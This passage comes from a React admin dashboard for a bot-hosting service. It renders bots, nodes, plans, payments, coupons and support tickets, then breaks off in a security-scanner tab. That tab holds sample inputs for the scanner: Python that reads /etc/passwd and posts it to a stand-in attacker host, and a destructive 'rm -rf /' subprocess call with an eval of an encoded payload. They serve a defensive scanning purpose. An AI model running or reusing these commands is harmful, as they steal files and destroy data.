                            <div className="flex items-center gap-3 text-xs text-slate-400">
                              <span>Owner: <strong className="text-slate-300 font-normal">@{bot.owner_username}</strong></span>
                              <span>•</span>
                              <span>Node: <strong className="text-slate-300 font-normal">{bot.node}</strong></span>
                              {bot.pid && (
                                <>
                                  <span>•</span>
                                  <span>PID: <span className="font-mono text-cyan-400">{bot.pid}</span></span>
                                </>
                              )}
                            </div>
                          </div>

                          {/* Quick Controls */}
                          <div className="flex items-center gap-2 shrink-0">
                            {bot.status === 'running' ? (
                              <>
                                <button
                                  onClick={() => handleBotAction(bot.id, 'restart')}
                                  title="Restart Container"
                                  className="p-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white border border-slate-700 transition"
                                >
                                  <RotateCcw className="w-3.5 h-3.5" />
                                </button>
                                <button
                                  onClick={() => handleBotAction(bot.id, 'stop')}
                                  title="Stop Process"
                                  className="p-2 rounded-lg bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 border border-rose-500/30 transition"
                                >
                                  <Square className="w-3.5 h-3.5" />
                                </button>
                              </>
                            ) : (
                              <button
                                onClick={() => handleBotAction(bot.id, 'start')}
                                title="Start Process"
                                className="p-2 rounded-lg bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 transition"
                              >
                                <Play className="w-3.5 h-3.5" />
                              </button>
                            )}

                            <button
                              onClick={() => setSelectedBotLogs(bot)}
                              className="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 text-xs font-medium flex items-center gap-1.5 transition"
                            >
                              <Terminal className="w-3.5 h-3.5 text-cyan-400" />
                              Logs
                            </button>
                          </div>
                        </div>
                      ))
                    )}
                  </div>
                </div>

                {/* Column 3: Quick Diagnostic Controls & Actions */}
                <div className="space-y-6">
                  
                  {/* System Load Widget */}
                  <div className="bg-[#0f172a]/90 rounded-2xl border border-slate-800/80 p-5 space-y-4">
                    <h3 className="font-bold text-slate-100 text-sm flex items-center gap-2">
                      <Activity className="w-4 h-4 text-cyan-400" />
                      Host Node Metrics
                    </h3>

                    {/* RAM Bar */}
                    <div className="space-y-1.5">
                      <div className="flex justify-between text-xs">
                        <span className="text-slate-400">RAM Utilization</span>
                        <span className="font-mono text-cyan-400">{status?.memory.usage_percent ?? 24}%</span>
                      </div>
                      <div className="h-2 w-full bg-slate-800 rounded-full overflow-hidden">
                        <div
                          className="h-full bg-gradient-to-r from-cyan-500 to-indigo-500 rounded-full transition-all duration-500"
                          style={{ width: `${status?.memory.usage_percent ?? 24}%` }}
                        ></div>
                      </div>
                      <div className="flex justify-between text-[11px] text-slate-500 font-mono">
                        <span>Used: {status?.memory.used_mb ?? 512} MB</span>
                        <span>Total: {status?.memory.total_mb ?? 4096} MB</span>
                      </div>
                    </div>

                    {/* CPU Bar */}
                    <div className="space-y-1.5 pt-2">
                      <div className="flex justify-between text-xs">
                        <span className="text-slate-400">CPU Compute</span>
                        <span className="font-mono text-indigo-400">{status?.cpu.load_percent ?? 15}%</span>
                      </div>
                      <div className="h-2 w-full bg-slate-800 rounded-full overflow-hidden">
                        <div
                          className="h-full bg-gradient-to-r from-indigo-500 to-purple-500 rounded-full transition-all duration-500"
                          style={{ width: `${Math.min(100, status?.cpu.load_percent ?? 15)}%` }}
                        ></div>
                      </div>
                      <div className="flex justify-between text-[11px] text-slate-500 font-mono">
                        <span>Cores: {status?.cpu.cores ?? 4} vCPU</span>
                        <span>Load Avg: {status?.load_average?.[0]?.toFixed(2) ?? '0.18'}</span>
                      </div>
                    </div>

                    {/* Quick Action Buttons */}
                    <div className="pt-3 border-t border-slate-800/80 space-y-2">
                      <button
                        onClick={handleTriggerVaultSync}
                        disabled={syncingVault}
                        className="w-full py-2 px-3 rounded-lg bg-amber-500/10 hover:bg-amber-500/20 text-amber-300 border border-amber-500/30 text-xs font-semibold flex items-center justify-center gap-2 transition disabled:opacity-50"
                      >
                        <Lock className={`w-3.5 h-3.5 ${syncingVault ? 'animate-spin' : ''}`} />
                        {syncingVault ? 'Encrypting & Syncing...' : 'Backup Vault Now'}
                      </button>

                      <button
                        onClick={handleToggleMaintenance}
                        className={`w-full py-2 px-3 rounded-lg border text-xs font-semibold flex items-center justify-center gap-2 transition ${
                          settings.maintenance_mode
                            ? 'bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-300 border-emerald-500/30'
                            : 'bg-slate-800 hover:bg-slate-700 text-slate-300 border-slate-700'
                        }`}
                      >
                        <Shield className="w-3.5 h-3.5" />
                        {settings.maintenance_mode ? 'End Maintenance Mode' : 'Toggle Maintenance Mode'}
                      </button>
                    </div>

                    {vaultMessage && (
                      <p className="text-xs text-emerald-400 bg-emerald-950/40 p-2 rounded border border-emerald-800/60 font-mono">
                        {vaultMessage}
                      </p>
                    )}
                  </div>

                  {/* Pending Transactions Callout */}
                  <div className="bg-[#0f172a]/90 rounded-2xl border border-slate-800/80 p-5 space-y-3">
                    <div className="flex items-center justify-between">
                      <h4 className="font-semibold text-xs text-slate-300 uppercase tracking-wider flex items-center gap-1.5">
                        <CreditCard className="w-3.5 h-3.5 text-cyan-400" />
                        Pending Approvals
                      </h4>
                      <span className="text-xs text-slate-500">
                        {payments.filter(p => p.status === 'pending_review').length} waiting
                      </span>
                    </div>

                    {payments.filter(p => p.status === 'pending_review').length === 0 ? (
                      <p className="text-xs text-slate-500 py-2">No manual payments pending review.</p>
                    ) : (
                      payments.filter(p => p.status === 'pending_review').map(tx => (
                        <div key={tx.id} className="p-3 rounded-lg bg-amber-950/20 border border-amber-500/30 space-y-2">
                          <div className="flex items-center justify-between text-xs">
                            <span className="font-bold text-amber-200">@{tx.username}</span>
                            <span className="font-mono text-amber-300 font-semibold">${tx.amount} {tx.currency}</span>
                          </div>
                          <p className="text-[11px] text-slate-400">{tx.method} • Plan: {tx.plan.toUpperCase()}</p>
                          {tx.proof_note && <p className="text-[11px] text-slate-300 italic">"{tx.proof_note}"</p>}
                          <div className="flex items-center gap-2 pt-1">
                            <button
                              onClick={() => handleVerifyPayment(tx.id, 'completed')}
                              className="px-2.5 py-1 rounded bg-emerald-600 hover:bg-emerald-500 text-white text-[11px] font-semibold flex-1 transition"
                            >
                              Approve
                            </button>
                            <button
                              onClick={() => handleVerifyPayment(tx.id, 'rejected')}
                              className="px-2.5 py-1 rounded bg-slate-800 hover:bg-rose-900/60 text-slate-300 hover:text-rose-300 text-[11px] transition"
                            >
                              Reject
                            </button>
                          </div>
                        </div>
                      ))
                    )}
                  </div>

                </div>

              </div>

            </div>
          )}

          {/* TAB 2: BOT INSTANCES */}
          {activeTab === 'bots' && (
            <div id="view-bots" className="space-y-6">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                <div>
                  <h2 className="text-xl font-bold text-white flex items-center gap-2">
                    <Server className="w-5 h-5 text-cyan-400" />
                    Bot Hosting Fleet
                  </h2>
                  <p className="text-xs text-slate-400">Deploy, supervise, inspect logs, and manage process resource allocations</p>
                </div>
                <button
                  id="btn-deploy-new-bot-screen"
                  onClick={() => setShowDeployModal(true)}
                  className="px-4 py-2 rounded-xl bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-slate-950 font-bold text-xs flex items-center gap-2 shadow-lg shadow-cyan-950/40 transition active:scale-95"
                >
                  <Plus className="w-4 h-4 text-slate-950" />
                  Deploy New Bot
                </button>
              </div>

              {/* Bot Fleet List */}
              <div className="grid grid-cols-1 gap-4">
                {bots.map(bot => (
                  <div
                    key={bot.id}
                    className="bg-[#0f172a]/90 rounded-2xl border border-slate-800 p-5 hover:border-slate-700 transition space-y-4"
                  >
                    <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
                      
                      <div className="flex items-start gap-4">
                        <div className={`p-3 rounded-xl border ${
                          bot.status === 'running'
                            ? 'bg-emerald-950/50 border-emerald-500/40 text-emerald-400'
                            : 'bg-slate-800/80 border-slate-700 text-slate-400'
                        }`}>
                          <Server className="w-6 h-6" />
                        </div>
                        <div>
                          <div className="flex items-center gap-2.5 flex-wrap">
                            <h3 className="font-bold text-white text-base">{bot.name}</h3>
                            <span className={`text-xs px-2.5 py-0.5 rounded-full font-mono font-medium flex items-center gap-1.5 ${
                              bot.status === 'running'
                                ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                                : 'bg-slate-800 text-slate-400 border border-slate-700'
                            }`}>
                              <span className={`w-1.5 h-1.5 rounded-full ${bot.status === 'running' ? 'bg-emerald-400 animate-pulse' : 'bg-slate-500'}`}></span>
                              {bot.status.toUpperCase()}
                            </span>
                            <span className="text-xs px-2 py-0.5 rounded bg-slate-800 text-slate-300 font-mono">
                              {bot.runtime.toUpperCase()}
                            </span>
                            <span className="text-xs px-2 py-0.5 rounded bg-cyan-950 text-cyan-300 border border-cyan-800 font-mono">
                              Tier: {bot.plan.toUpperCase()}
                            </span>
                          </div>
                          
                          <div className="flex items-center gap-4 text-xs text-slate-400 mt-2 flex-wrap font-mono">
                            <span>ID: <span className="text-slate-300">{bot.id}</span></span>
                            <span>•</span>
                            <span>Owner: <span className="text-cyan-400">@{bot.owner_username}</span></span>
                            <span>•</span>
                            <span>Entrypoint: <span className="text-slate-300">{bot.entrypoint}</span></span>
                            <span>•</span>
                            <span>Node: <span className="text-slate-300">{bot.node}</span></span>
                          </div>
                        </div>
                      </div>

                      {/* Control Panel Buttons */}
                      <div className="flex items-center gap-2 flex-wrap">
                        {bot.status === 'running' ? (
                          <>
                            <button
                              onClick={() => handleBotAction(bot.id, 'restart')}
                              className="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 text-xs font-semibold flex items-center gap-1.5 transition"
                            >
                              <RotateCcw className="w-3.5 h-3.5 text-cyan-400" />
                              Restart
                            </button>
                            <button
                              onClick={() => handleBotAction(bot.id, 'stop')}
                              className="px-3 py-1.5 rounded-lg bg-rose-500/10 hover:bg-rose-500/20 text-rose-300 border border-rose-500/30 text-xs font-semibold flex items-center gap-1.5 transition"
                            >
                              <Square className="w-3.5 h-3.5" />
                              Stop
                            </button>
                          </>
                        ) : (
                          <button
                            onClick={() => handleBotAction(bot.id, 'start')}
                            className="px-3 py-1.5 rounded-lg bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 text-xs font-semibold flex items-center gap-1.5 transition"
                          >
                            <Play className="w-3.5 h-3.5" />
                            Start Process
                          </button>
                        )}

                        <button
                          onClick={() => setSelectedBotLogs(bot)}
                          className="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 text-xs font-semibold flex items-center gap-1.5 transition"
                        >
                          <Terminal className="w-3.5 h-3.5 text-cyan-400" />
                          Live Logs ({bot.logs.length})
                        </button>

                        <button
                          onClick={() => handleDeleteBot(bot.id)}
                          title="Terminate and Delete"
                          className="p-2 rounded-lg bg-slate-800 hover:bg-rose-950 text-slate-400 hover:text-rose-400 border border-slate-700 transition"
                        >
                          <Trash2 className="w-3.5 h-3.5" />
                        </button>
                      </div>

                    </div>

                    {/* Resources bar */}
                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 pt-3 border-t border-slate-800/60 text-xs">
                      <div className="flex items-center justify-between p-2.5 rounded-lg bg-[#0b101e] border border-slate-800">
                        <span className="text-slate-400">Allocated Memory</span>
                        <span className="font-mono text-cyan-300 font-semibold">{bot.memory_mb} MB / {bot.memory_limit_mb} MB</span>
                      </div>
                      <div className="flex items-center justify-between p-2.5 rounded-lg bg-[#0b101e] border border-slate-800">
                        <span className="text-slate-400">Compute Load</span>
                        <span className="font-mono text-indigo-300 font-semibold">{bot.cpu_usage}% vCPU</span>
                      </div>
                      <div className="flex items-center justify-between p-2.5 rounded-lg bg-[#0b101e] border border-slate-800">
                        <span className="text-slate-400">Process PID</span>
                        <span className="font-mono text-slate-300">{bot.pid ?? 'Inactive'}</span>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* TAB 3: NODES & CLUSTERS */}
          {activeTab === 'nodes' && (
            <div id="view-nodes" className="space-y-6">
              <div>
                <h2 className="text-xl font-bold text-white flex items-center gap-2">
                  <Layers className="w-5 h-5 text-cyan-400" />
                  Cluster Infrastructure & Worker Nodes
                </h2>
                <p className="text-xs text-slate-400">Manage master controllers, dedicated VPS nodes, and Railway containers</p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                {nodes.map(node => (
                  <div key={node.id} className="bg-[#0f172a]/90 rounded-2xl border border-slate-800 p-5 space-y-4">
                    <div className="flex items-start justify-between">
                      <div>
                        <span className="text-[10px] px-2 py-0.5 rounded-md bg-slate-800 text-slate-400 font-mono">
                          {node.type}
                        </span>
                        <h3 className="font-bold text-white text-base mt-1">{node.name}</h3>
                        <p className="text-xs text-slate-400 flex items-center gap-1 mt-0.5">
                          <Globe className="w-3.5 h-3.5 text-cyan-400" />
                          {node.region}
                        </p>
                      </div>
                      <span className="text-xs px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 flex items-center gap-1 font-mono">
                        <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
                        {node.ping_ms}ms
                      </span>
                    </div>

                    <div className="space-y-2 pt-2 border-t border-slate-800/80 text-xs">
                      <div className="flex justify-between">
                        <span className="text-slate-400">IP Address:</span>
                        <span className="font-mono text-slate-300">{node.ip}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-slate-400">Active Sandboxes:</span>
                        <span className="font-mono text-cyan-400 font-bold">{node.active_containers}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-slate-400">CPU Usage:</span>
                        <span className="font-mono text-indigo-400 font-semibold">{node.cpu_percent}% ({node.cpu_cores} Cores)</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-slate-400">RAM Allocated:</span>
                        <span className="font-mono text-slate-300">{node.ram_used_gb} GB / {node.ram_total_gb} GB</span>
                      </div>
                    </div>

                    <div className="pt-2">
                      <button
                        onClick={() => alert(`Node ${node.name} status verified. Latency: ${node.ping_ms}ms. All container daemons active.`)}
                        className="w-full py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold transition"
                      >
                        Run Health Diagnostics
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* TAB 4: PLANS & QUOTAS */}
          {activeTab === 'plans' && (
            <div id="view-plans" className="space-y-6">
              <div>
                <h2 className="text-xl font-bold text-white flex items-center gap-2">
                  <Sliders className="w-5 h-5 text-cyan-400" />
                  Hosting Plans & Resource Quotas
                </h2>
                <p className="text-xs text-slate-400">Strict container resource caps as enforced by HooHost's sandbox_runtime.py</p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
                {plans.map(p => (
                  <div
                    key={p.id}
                    className={`bg-[#0f172a]/90 rounded-2xl border p-5 flex flex-col justify-between space-y-4 relative ${
                      p.is_popular
                        ? 'border-cyan-500/60 shadow-lg shadow-cyan-950/40 ring-1 ring-cyan-500/30'
                        : 'border-slate-800'
                    }`}
                  >
                    {p.is_popular && (
                      <span className="absolute -top-3 left-1/2 -translate-x-1/2 px-3 py-0.5 rounded-full bg-gradient-to-r from-cyan-500 to-blue-600 text-slate-950 font-bold text-[10px] uppercase tracking-wider">
                        Most Popular
                      </span>
                    )}

                    <div>
                      <h3 className="font-bold text-white text-lg">{p.name}</h3>
                      <div className="mt-2 flex items-baseline gap-1">
                        <span className="text-2xl font-bold font-mono text-cyan-400">${p.price_monthly_usd}</span>
                        <span className="text-xs text-slate-400">/ mo</span>
                        <span className="text-xs text-slate-500 ml-2 font-mono">({p.price_bdt} BDT)</span>
                      </div>

                      <div className="mt-4 space-y-2 text-xs border-y border-slate-800 py-3">
                        <div className="flex justify-between">
                          <span className="text-slate-400">Compute Limit:</span>
                          <span className="font-mono text-slate-200">{p.cpus}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-slate-400">Memory Cap:</span>
                          <span className="font-mono text-slate-200">{p.ram_mb} MB</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-slate-400">PIDs Limit:</span>
                          <span className="font-mono text-slate-200">{p.pids_limit} procs</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-slate-400">Disk Storage:</span>
                          <span className="font-mono text-slate-200">{p.storage_mb} MB</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-slate-400">Allowed Bots:</span>
                          <span className="font-mono text-cyan-400 font-bold">{p.allowed_bots} Bots</span>
                        </div>
                      </div>

                      <ul className="mt-4 space-y-2 text-xs text-slate-300">
                        {p.features.map((feat, idx) => (
                          <li key={idx} className="flex items-center gap-2">
                            <CheckCircle2 className="w-3.5 h-3.5 text-cyan-400 shrink-0" />
                            <span>{feat}</span>
                          </li>
                        ))}
                      </ul>
                    </div>

                    <button
                      onClick={() => {
                        setNewBotPlan(p.id);
                        setShowDeployModal(true);
                      }}
                      className="w-full py-2 rounded-xl bg-slate-800 hover:bg-cyan-600 hover:text-slate-950 text-slate-200 text-xs font-bold transition mt-4"
                    >
                      Deploy on {p.name}
                    </button>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* TAB 5: MERCHANT & PAYMENTS */}
          {activeTab === 'payments' && (
            <div id="view-payments" className="space-y-6">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                <div>
                  <h2 className="text-xl font-bold text-white flex items-center gap-2">
                    <CreditCard className="w-5 h-5 text-cyan-400" />
                    Merchant Gateways & Invoices
                  </h2>
                  <p className="text-xs text-slate-400">Automated OxaPay crypto invoices + Manual review for bKash, Nagad, and Binance Pay</p>
                </div>
              </div>

              {/* Gateway Cards */}
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div className="bg-[#0f172a]/90 rounded-2xl border border-slate-800 p-4 space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-semibold text-slate-300">OxaPay Crypto Engine</span>
                    <span className="text-[10px] px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-400 border border-emerald-500/30">
                      Automated
                    </span>
                  </div>
                  <p className="text-xs text-slate-400">USDT (TRC20/BEP20), BTC, LTC, TRX, ETH instant blockchain confirmation.</p>
                </div>

                <div className="bg-[#0f172a]/90 rounded-2xl border border-slate-800 p-4 space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-semibold text-slate-300">bKash & Nagad (BDT)</span>
                    <span className="text-[10px] px-2 py-0.5 rounded-full bg-cyan-500/20 text-cyan-400 border border-cyan-500/30">
                      Merchant / Manual
                    </span>
                  </div>
                  <p className="text-xs text-slate-400">bKash: {settings.bkash_number || '01700000000'} | Nagad: {settings.nagad_number || '01800000000'}</p>
                </div>

                <div className="bg-[#0f172a]/90 rounded-2xl border border-slate-800 p-4 space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-semibold text-slate-300">Binance Pay</span>
                    <span className="text-[10px] px-2 py-0.5 rounded-full bg-indigo-500/20 text-indigo-400 border border-indigo-500/30">
                      Direct P2P
                    </span>
                  </div>
                  <p className="text-xs text-slate-400">Instant user-to-merchant pay ID verification via transaction hash.</p>
                </div>
              </div>

              {/* Transactions Table */}
              <div className="bg-[#0f172a]/90 rounded-2xl border border-slate-800 overflow-hidden">
                <div className="p-4 border-b border-slate-800 flex items-center justify-between">
                  <h3 className="font-bold text-white text-sm">Payment Transaction History</h3>
                  <span className="text-xs text-slate-400">{payments.length} total records</span>
                </div>

                <div className="overflow-x-auto">
                  <table className="w-full text-left text-xs">
                    <thead className="bg-[#0b101e] text-slate-400 uppercase font-mono border-b border-slate-800">
                      <tr>
                        <th className="py-3 px-4">Tx ID</th>
                        <th className="py-3 px-4">User</th>
                        <th className="py-3 px-4">Amount</th>
                        <th className="py-3 px-4">Gateway</th>
                        <th className="py-3 px-4">Plan</th>
                        <th className="py-3 px-4">Status</th>
                        <th className="py-3 px-4">Actions</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-800/60 text-slate-300 font-mono">
                      {payments.map(tx => (
                        <tr key={tx.id} className="hover:bg-slate-800/30">
                          <td className="py-3 px-4 font-semibold text-cyan-400">{tx.id}</td>
                          <td className="py-3 px-4 font-sans text-slate-200">@{tx.username}</td>
                          <td className="py-3 px-4 font-bold text-white">${tx.amount} {tx.currency}</td>
                          <td className="py-3 px-4 font-sans text-slate-400">{tx.method}</td>
                          <td className="py-3 px-4 text-indigo-300">{tx.plan.toUpperCase()}</td>
                          <td className="py-3 px-4">
                            <span className={`px-2 py-0.5 rounded-full text-[11px] font-sans font-medium ${
                              tx.status === 'completed'
                                ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                                : tx.status === 'pending_review'
                                ? 'bg-amber-500/20 text-amber-400 border border-amber-500/30'
                                : 'bg-rose-500/20 text-rose-400 border border-rose-500/30'
                            }`}>
                              {tx.status.replace('_', ' ').toUpperCase()}
                            </span>
                          </td>
                          <td className="py-3 px-4 font-sans">
                            {tx.status === 'pending_review' ? (
                              <div className="flex items-center gap-1.5">
                                <button
                                  onClick={() => handleVerifyPayment(tx.id, 'completed')}
                                  className="px-2 py-1 rounded bg-emerald-600 hover:bg-emerald-500 text-white text-[11px] font-semibold transition"
                                >
                                  Approve
                                </button>
                                <button
                                  onClick={() => handleVerifyPayment(tx.id, 'rejected')}
                                  className="px-2 py-1 rounded bg-slate-800 hover:bg-rose-900/60 text-slate-300 hover:text-rose-300 text-[11px] transition"
                                >
                                  Reject
                                </button>
                              </div>
                            ) : (
                              <span className="text-slate-500 text-xs">Processed</span>
                            )}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          )}

          {/* TAB 6: COUPONS */}
          {activeTab === 'coupons' && (
            <div id="view-coupons" className="space-y-6">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                <div>
                  <h2 className="text-xl font-bold text-white flex items-center gap-2">
                    <Tag className="w-5 h-5 text-cyan-400" />
                    Promotional Coupons & Voucher Codes
                  </h2>
                  <p className="text-xs text-slate-400">Create discount vouchers for community members and Telegram subscribers</p>
                </div>
                <button
                  onClick={() => setShowAddCouponModal(true)}
                  className="px-4 py-2 rounded-xl bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-slate-950 font-bold text-xs flex items-center gap-1.5 transition"
                >
                  <Plus className="w-4 h-4 text-slate-950" />
                  Create Coupon
                </button>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                {coupons.map(cp => (
                  <div key={cp.code} className="bg-[#0f172a]/90 rounded-2xl border border-slate-800 p-5 space-y-3 relative overflow-hidden">
                    <div className="flex items-center justify-between">
                      <span className="text-lg font-bold font-mono tracking-wider text-cyan-400 flex items-center gap-2">
                        {cp.code}
                        <button
                          onClick={() => copyToClipboard(cp.code)}
                          title="Copy Code"
                          className="text-slate-500 hover:text-white transition"
                        >
                          {copiedCode === cp.code ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                        </button>
                      </span>
                      <span className="text-xs px-2.5 py-0.5 rounded-full bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 font-bold">
                        {cp.discount_percent}% OFF
                      </span>
                    </div>

                    <div className="space-y-1.5 text-xs text-slate-400 border-t border-slate-800 pt-2 font-mono">
                      <div className="flex justify-between">
                        <span>Used:</span>
                        <span className="text-slate-200">{cp.used_count} / {cp.max_uses} redemptions</span>
                      </div>
                      <div className="flex justify-between">
                        <span>Expires:</span>
                        <span className="text-slate-200">{cp.expires_at}</span>
                      </div>
                    </div>

                    <div className="pt-2 flex justify-end">
                      <button
                        onClick={() => handleDeleteCoupon(cp.code)}
                        className="text-rose-400 hover:text-rose-300 text-xs flex items-center gap-1 transition"
                      >
                        <Trash2 className="w-3.5 h-3.5" />
                        Delete Coupon
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* TAB 7: SUPPORT DESK */}
          {activeTab === 'tickets' && (
            <div id="view-tickets" className="space-y-6">
              <div>
                <h2 className="text-xl font-bold text-white flex items-center gap-2">
                  <Ticket className="w-5 h-5 text-cyan-400" />
                  Support Helpdesk & User Tickets
                </h2>
                <p className="text-xs text-slate-400">Direct user communication and assistance channel</p>
              </div>

              <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                
                {/* Tickets list */}
                <div className="space-y-3">
                  {tickets.map(t => (
                    <div
                      key={t.id}
                      onClick={() => setActiveTicket(t)}
                      className={`p-4 rounded-xl border transition cursor-pointer ${
                        activeTicket?.id === t.id
                          ? 'bg-cyan-500/10 border-cyan-500/50'
                          : 'bg-[#0f172a]/90 border-slate-800 hover:border-slate-700'
                      }`}
                    >
                      <div className="flex items-center justify-between text-xs mb-1.5">
                        <span className="font-bold text-slate-300">@{t.username}</span>
                        <span className={`px-2 py-0.5 rounded-full text-[10px] font-mono ${
                          t.status === 'open'
                            ? 'bg-cyan-500/20 text-cyan-400 border border-cyan-500/30'
                            : 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                        }`}>
                          {t.status.toUpperCase()}
                        </span>
                      </div>
                      <h4 className="text-sm font-semibold text-white line-clamp-1">{t.subject}</h4>
                      <p className="text-[11px] text-slate-500 mt-2 font-mono">{t.created_at.substring(0, 10)}</p>
                    </div>
                  ))}
                </div>

                {/* Ticket Message Thread */}
                <div className="lg:col-span-2 bg-[#0f172a]/90 rounded-2xl border border-slate-800 p-5 flex flex-col h-[520px]">
                  {activeTicket ? (
                    <>
                      <div className="flex items-center justify-between pb-3 border-b border-slate-800">
                        <div>
                          <h3 className="font-bold text-white text-base">{activeTicket.subject}</h3>
                          <p className="text-xs text-slate-400">User: @{activeTicket.username} • Priority: {activeTicket.priority.toUpperCase()}</p>
                        </div>
                        {activeTicket.status !== 'resolved' && (
                          <button
                            onClick={() => handleResolveTicket(activeTicket.id)}
                            className="px-3 py-1 rounded-lg bg-emerald-600/30 hover:bg-emerald-600/50 text-emerald-300 border border-emerald-500/40 text-xs font-semibold transition"
                          >
                            Mark as Resolved
                          </button>
                        )}
                      </div>

                      {/* Chat messages */}
                      <div className="flex-1 overflow-y-auto py-4 space-y-3">
                        {activeTicket.messages.map((m, idx) => (
                          <div
                            key={idx}
                            className={`flex flex-col max-w-[80%] ${
                              m.role === 'admin' ? 'ml-auto items-end' : 'mr-auto items-start'
                            }`}
                          >
                            <div className="flex items-center gap-1.5 text-[11px] text-slate-400 mb-1">
                              <span>{m.sender}</span>
                              <span>•</span>
                              <span>{m.time}</span>
                            </div>
                            <div className={`p-3 rounded-xl text-xs leading-relaxed ${
                              m.role === 'admin'
                                ? 'bg-cyan-600 text-white'
                                : 'bg-[#0b101e] border border-slate-800 text-slate-200'
                            }`}>
                              {m.text}
                            </div>
                          </div>
                        ))}
                      </div>

                      {/* Reply composer */}
                      <form onSubmit={handleSendTicketReply} className="pt-3 border-t border-slate-800 flex gap-2">
                        <input
                          type="text"
                          value={ticketReplyText}
                          onChange={(e) => setTicketReplyText(e.target.value)}
                          placeholder="Type an admin reply to user..."
                          className="flex-1 bg-[#0b101e] border border-slate-800 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-cyan-500"
                        />
                        <button
                          type="submit"
                          className="px-4 py-2 rounded-xl bg-cyan-600 hover:bg-cyan-500 text-slate-950 font-bold text-xs flex items-center gap-1.5 transition"
                        >
                          <Send className="w-3.5 h-3.5 text-slate-950" />
                          Reply
                        </button>
                      </form>
                    </>
                  ) : (
                    <div className="flex-1 flex flex-col items-center justify-center text-slate-500 text-xs">
                      <Ticket className="w-8 h-8 mb-2 opacity-50" />
                      Select a ticket from the left panel to read and reply.
                    </div>
                  )}
                </div>

              </div>
            </div>
          )}

          {/* TAB 8: SECURITY & AI PREFLIGHT SCANNER */}
          {activeTab === 'scanner' && (
            <div id="view-scanner" className="space-y-6">
              <div>
                <h2 className="text-xl font-bold text-white flex items-center gap-2">
                  <ShieldCheck className="w-5 h-5 text-cyan-400" />
                  HooHost Security & AI Preflight Scanner
                </h2>
                <p className="text-xs text-slate-400">
                  Static analysis engine powered by <code className="text-cyan-300">security_scanner_free.py</code> and AST rules. Checks for root traversals, arbitrary subprocess exec, and raw sockets.
                </p>
              </div>

              {/* Sample Code Selectors */}
              <div className="flex items-center gap-2 flex-wrap text-xs">
                <span className="text-slate-400">Load Template:</span>
                <button
                  onClick={() => setScannerCode(`import os
import telebot

bot = telebot.TeleBot("YOUR_TOKEN")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Hello! I am a verified safe Telegram bot hosted on HooHost.")

bot.polling()`)}
                  className="px-2.5 py-1 rounded-md bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition"
                >
                  Safe Telegram Bot
                </button>
                <button
                  onClick={() => setScannerCode(`import os
import requests

# Malicious Attempt: Exfiltrating /etc/passwd or /root
with open('/etc/passwd', 'r') as f:
    stolen_data = f.read()
requests.post('https://attacker.site/leak', data=stolen_data)`)}
                  className="px-2.5 py-1 rounded-md bg-rose-950/40 hover:bg-rose-900/60 text-rose-300 border border-rose-800/60 transition"
                >
                  Malicious Exfiltration Sample
                </button>
                <button
                  onClick={() => setScannerCode(`import subprocess
import base64

# Shell command with unescaped stdin
subprocess.Popen("rm -rf /", shell=True)
payload = base64.b64decode("cHJpbnQoJ2hhY2tlZCcp")
eval(payload)`)}
                  className="px-2.5 py-1 rounded-md bg-amber-950/40 hover:bg-amber-900/60 text-amber-300 border border-amber-800/60 transition"
                >
                  Arbitrary Subprocess & Exec Sample
                </button>
              </div>

